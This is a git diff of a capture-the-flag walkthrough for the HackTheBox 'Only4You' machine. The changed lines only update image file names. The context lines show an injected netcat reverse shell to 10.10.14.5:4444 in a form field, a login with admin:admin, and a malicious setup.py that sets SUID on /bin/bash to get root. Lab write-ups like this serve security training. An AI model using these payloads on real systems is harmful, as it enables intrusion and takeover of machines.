@@ -25,11 +25,11 @@ Port 80 is hosting a corporate website.
 
 At the very bottom, it seems that we can download a trial of their application. This redirects us to the `beta.only4you.htb` domain.
 
-<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (64) (1).png" alt=""><figcaption></figcaption></figure>
 
 The subdomain shows us this site where we can view source code.
 
-<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (69) (1).png" alt=""><figcaption></figcaption></figure>
 
 I'm assuming that this is the source code for the Resizer and Converter application that is present in the corner. When we download the source code, there is an `app.py` and `tool.py` file that we have to analyse.
 
@@ -216,7 +216,7 @@ Upgrade-Insecure-Requests: 1
 name=test&email=test%40website.com+|+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.5+4444+>/tmp/f&subject=test&message=test
 ```
 
-<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (58) (5).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -274,7 +274,7 @@ Port 8001 was another login page:
 
 I tried some weak credentials, and found that `admin:admin` worked. This was some sort of dashboard with sales and stuff.
 
-<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71) (3).png" alt=""><figcaption></figcaption></figure>
 
 Within the Employees tab, we can search for the names of employees.
 
@@ -339,7 +339,7 @@ User john may run the following commands on only4you:
 
 Obviously, there's a wildcard here and it is vulnerable. Now, this was using port 3000, and we should try to port forward that. Doing so would reveal that port 3000 is running a Gogs server.
 
-<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (61) (2).png" alt=""><figcaption></figcaption></figure>
 
 Checking the repository, we can see that `john` is a user on the service. We can reuse the password we found earlier to login. Afterwards, we can create repositories on this.
 
@@ -359,6 +359,6 @@ I just modifed the `setup.py` file to run `os.system("chmod u+s /bin/bash")`. Af
 
 Then, we can just run the command to download it.
 
-<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (73) (4).png" alt=""><figcaption></figcaption></figure>
 
 We can easily get a root shell at this point.&#x20;
